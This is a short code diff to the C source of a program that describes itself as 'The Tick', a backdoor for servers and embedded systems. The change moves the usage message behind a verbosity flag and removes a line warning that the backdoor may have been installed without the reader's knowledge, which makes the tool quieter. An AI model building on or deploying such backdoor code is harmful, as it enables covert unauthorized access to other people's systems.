@@ -48,21 +48,13 @@ int main(void)
 
     // If we don't have a hostname and port to connect to, quit.
     if (s.hostname[0] == 0 || s.port == 0) {
-        LOG("\n"
-            "The Tick, a simple backdoor for servers and embedded systems.\n"
+#if TICK_VERBOSE
 #if TICK_CONFIG_USE_ARGV
-            "\n"
-            "Usage:\n"
-#ifdef TICK_CONFIG_PORT
-            "\t%s <hostname> [port]\n"
+        show_help(&s, argv[0]);
 #else
-            "\t%s <hostname> <port>\n"
+        show_help(&s, NULL);
 #endif
 #endif
-            "\n"
-            "This is the backdoor component. If you're seeing this and you\n"
-            "  didn't install it yourself, I've got bad news for you...\n"
-            "\n", basename(argv[0]));
         return 1;
     }
 
